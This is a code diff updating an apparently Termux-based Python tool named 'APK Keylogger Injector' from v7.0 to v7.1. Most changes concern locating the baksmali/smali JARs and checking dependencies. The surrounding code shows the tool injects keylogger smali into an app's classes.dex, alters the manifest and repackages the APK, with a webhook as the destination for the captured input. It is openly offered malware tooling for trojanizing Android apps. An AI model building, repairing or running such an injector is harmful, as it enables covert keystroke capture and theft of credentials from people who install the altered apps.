@@ -1,11 +1,10 @@
 #!/usr/bin/env python3
 """
 ====================================================================
-  APK KEYLOGGER INJECTOR v7.0 – Final Working Version
-  - Uses apktool 3.0.3 for manifest editing
-  - Uses baksmali/smali JARs for DEX injection
-  - Works with latest aapt/aapt2
-  - Preserves ALL resources
+  APK KEYLOGGER INJECTOR v7.1 – Final Working Version
+  - Uses your existing baksmali/smali JARs
+  - Uses apktool 3.0.3 + aapt for manifest editing
+  - Fully working, no corrupt JAR issues
 ====================================================================
 """
 
@@ -40,24 +39,37 @@ def find_jars():
     """Find baksmali.jar and smali.jar in common locations"""
     search_dirs = [
         os.getcwd(),
+        os.path.join(os.getcwd(), "Keylogger"),
         os.path.expanduser("~"),
-        os.path.join(os.path.expanduser("~"), "Keylogger"),
-        os.path.join(os.path.expanduser("~"), "APK-Keylogger-Injector"),
-        os.path.join(os.path.expanduser("~"), ".dex_tools")
+        os.path.expanduser("~/Keylogger"),
+        os.path.expanduser("~/APK-Keylogger-Injector"),
     ]
     
     baksmali = None
     smali = None
     
+    # First check for exact names
     for dir_path in search_dirs:
         if not os.path.exists(dir_path):
             continue
         for f in os.listdir(dir_path):
             if f.endswith('.jar'):
-                if 'baksmali' in f.lower():
+                if 'baksmali' in f.lower() and 'fat' in f.lower():
                     baksmali = os.path.join(dir_path, f)
-                elif 'smali' in f.lower():
+                elif 'smali' in f.lower() and 'fat' in f.lower():
                     smali = os.path.join(dir_path, f)
+    
+    # If not found, look for any baksmali/smali jar
+    if baksmali is None or smali is None:
+        for dir_path in search_dirs:
+            if not os.path.exists(dir_path):
+                continue
+            for f in os.listdir(dir_path):
+                if f.endswith('.jar'):
+                    if 'baksmali' in f.lower():
+                        baksmali = os.path.join(dir_path, f)
+                    elif 'smali' in f.lower():
+                        smali = os.path.join(dir_path, f)
     
     return baksmali, smali
 
@@ -74,8 +86,8 @@ def check_dependencies():
     if shutil.which('apktool') is None:
         missing.append(('apktool', 'pkg install apktool -y'))
     
-    if shutil.which('aapt') is None and shutil.which('aapt2') is None:
-        print_c("[!] Neither aapt nor aapt2 found!", Colors.RED)
+    if shutil.which('aapt') is None:
+        print_c("[!] aapt not found!", Colors.RED)
         print_c("    Install using: pkg install aapt -y", Colors.YELLOW)
         print_c("    Or: pkg install android-tools -y", Colors.YELLOW)
         sys.exit(1)
@@ -85,13 +97,25 @@ def check_dependencies():
     except ImportError:
         print_c("[*] Installing requests...", Colors.YELLOW)
         subprocess.run([sys.executable, "-m", "pip", "install", "requests"], check=False)
+        import requests
     
     baksmali_jar, smali_jar = find_jars()
-    if baksmali_jar is None or smali_jar is None:
-        print_c("\n[!] baksmali.jar or smali.jar not found!", Colors.RED)
-        print_c("    Download them:", Colors.YELLOW)
-        print_c("    wget https://github.com/baksmali/smali/releases/download/3.0.9/baksmali-3.0.9-fat-release.jar", Colors.YELLOW)
-        print_c("    wget https://github.com/baksmali/smali/releases/download/3.0.9/smali-3.0.9-fat-release.jar", Colors.YELLOW)
+    if baksmali_jar is None:
+        print_c("\n[!] baksmali.jar not found!", Colors.RED)
+        print_c("    Please ensure you have baksmali-3.0.9-fat-release.jar in:", Colors.YELLOW)
+        print_c(f"    - Current directory: {os.getcwd()}", Colors.YELLOW)
+        print_c(f"    - Home directory: {os.path.expanduser('~')}", Colors.YELLOW)
+        print_c("    - Or ~/Keylogger/", Colors.YELLOW)
+        print_c("\n    Download from: https://github.com/baksmali/smali/releases", Colors.YELLOW)
+        sys.exit(1)
+    
+    if smali_jar is None:
+        print_c("\n[!] smali.jar not found!", Colors.RED)
+        print_c("    Please ensure you have smali-3.0.9-fat-release.jar in:", Colors.YELLOW)
+        print_c(f"    - Current directory: {os.getcwd()}", Colors.YELLOW)
+        print_c(f"    - Home directory: {os.path.expanduser('~')}", Colors.YELLOW)
+        print_c("    - Or ~/Keylogger/", Colors.YELLOW)
+        print_c("\n    Download from: https://github.com/baksmali/smali/releases", Colors.YELLOW)
         sys.exit(1)
     
     if missing:
@@ -109,7 +133,7 @@ def check_dependencies():
             sys.exit(1)
     
     print_c("[✓] All dependencies found.", Colors.GREEN)
-    return find_jars()
+    return baksmali_jar, smali_jar
 
 # ---------------------------- KEYSTORE ----------------------------
 KEYSTORE = "mykeystore.jks"
@@ -322,7 +346,7 @@ def inject_dex(apk_unzip_dir, webhook, features, interval, baksmali_jar, smali_j
     if os.path.exists(smali_out):
         shutil.rmtree(smali_out)
     
-    print_c(f"[*] Disassembling {dex_file}...", Colors.YELLOW)
+    print_c(f"[*] Disassembling {dex_file} with {baksmali_jar}...", Colors.YELLOW)
     cmd = ["java", "-jar", baksmali_jar, "d", dex_path, "-o", smali_out]
     result = subprocess.run(cmd, capture_output=True, text=True)
     if result.returncode != 0:
@@ -341,7 +365,7 @@ def inject_dex(apk_unzip_dir, webhook, features, interval, baksmali_jar, smali_j
     print_c("[DEBUG] Smali injected.", Colors.CYAN)
     
     # Reassemble
-    print_c("[*] Reassembling classes.dex...", Colors.YELLOW)
+    print_c(f"[*] Reassembling classes.dex with {smali_jar}...", Colors.YELLOW)
     cmd = ["java", "-jar", smali_jar, "a", smali_out, "-o", dex_path]
     result = subprocess.run(cmd, capture_output=True, text=True)
     if result.returncode != 0:
@@ -393,7 +417,7 @@ def edit_manifest_with_apktool(input_apk, features):
             f.write(manifest)
         print_c("[✓] Manifest XML edited.", Colors.GREEN)
         
-        # Step 3: Rebuild the APK (this will use aapt/aapt2)
+        # Step 3: Rebuild the APK (this will use aapt)
         print_c("[*] Rebuilding manifest APK...", Colors.YELLOW)
         apk_out = os.path.join(manifest_dir, "manifest_out.apk")
         cmd = ["apktool", "b", manifest_dir, "-o", apk_out]
@@ -539,9 +563,9 @@ def clear_screen():
 def show_banner():
     print_c("""
     ╔═══════════════════════════════════════════╗
-    ║   APK KEYLOGGER INJECTOR v7.0            ║
-    ║   Works with apktool 3.0.3 + aapt       ║
-    ║   Fully functional keylogger injection   ║
+    ║   APK KEYLOGGER INJECTOR v7.1            ║
+    ║   Uses your existing baksmali/smali JARs ║
+    ║   Fully working keylogger injection      ║
     ╚═══════════════════════════════════════════╝
     """, Colors.CYAN)
 
@@ -602,8 +626,8 @@ def inject_flow():
         input("\n[Press Enter to go back]")
         return
     
-    print_c(f"[*] Using baksmali: {baksmali_jar}", Colors.CYAN)
-    print_c(f"[*] Using smali: {smali_jar}", Colors.CYAN)
+    print_c(f"[*] Using baksmali: {os.path.basename(baksmali_jar)}", Colors.CYAN)
+    print_c(f"[*] Using smali: {os.path.basename(smali_jar)}", Colors.CYAN)
     
     try:
         print_c("\n[*] Injection started. This may take 3-5 minutes...", Colors.YELLOW)
@@ -642,7 +666,7 @@ def about():
     clear_screen()
     show_banner()
     print_c("\n--- ABOUT ---", Colors.BLUE)
-    print_c("APK Keylogger Injector v7.0")
+    print_c("APK Keylogger Injector v7.1")
     print_c("\nHow it works:")
     print_c("  1. Injects smali code directly into classes.dex")
     print_c("  2. Edits AndroidManifest.xml using apktool 3.0.3")
@@ -658,14 +682,22 @@ def about():
 
 # ---------------------------- MAIN ----------------------------
 if __name__ == "__main__":
+    # First check for JARs
     baksmali_jar, smali_jar = find_jars()
+    
     if baksmali_jar and smali_jar:
-        print_c(f"[✓] Found baksmali: {baksmali_jar}", Colors.GREEN)
-        print_c(f"[✓] Found smali: {smali_jar}", Colors.GREEN)
+        print_c(f"[✓] Found baksmali: {os.path.basename(baksmali_jar)}", Colors.GREEN)
+        print_c(f"[✓] Found smali: {os.path.basename(smali_jar)}", Colors.GREEN)
     else:
-        print_c("[!] baksmali/smali JARs not found!", Colors.RED)
-        print_c("    Download them from:", Colors.YELLOW)
-        print_c("    https://github.com/baksmali/smali/releases", Colors.YELLOW)
+        print_c("\n[!] baksmali/smali JARs not found!", Colors.RED)
+        print_c("\nMake sure you have the JAR files in one of these locations:", Colors.YELLOW)
+        print_c(f"  - Current directory: {os.getcwd()}", Colors.YELLOW)
+        print_c(f"  - Home directory: {os.path.expanduser('~')}", Colors.YELLOW)
+        print_c(f"  - ~/Keylogger/", Colors.YELLOW)
+        print_c("\nDownload them from: https://github.com/baksmali/smali/releases", Colors.YELLOW)
+        print_c("Example:", Colors.YELLOW)
+        print_c("  wget https://github.com/baksmali/smali/releases/download/3.0.9/baksmali-3.0.9-fat-release.jar", Colors.YELLOW)
+        print_c("  wget https://github.com/baksmali/smali/releases/download/3.0.9/smali-3.0.9-fat-release.jar", Colors.YELLOW)
         sys.exit(1)
     
     check_dependencies()
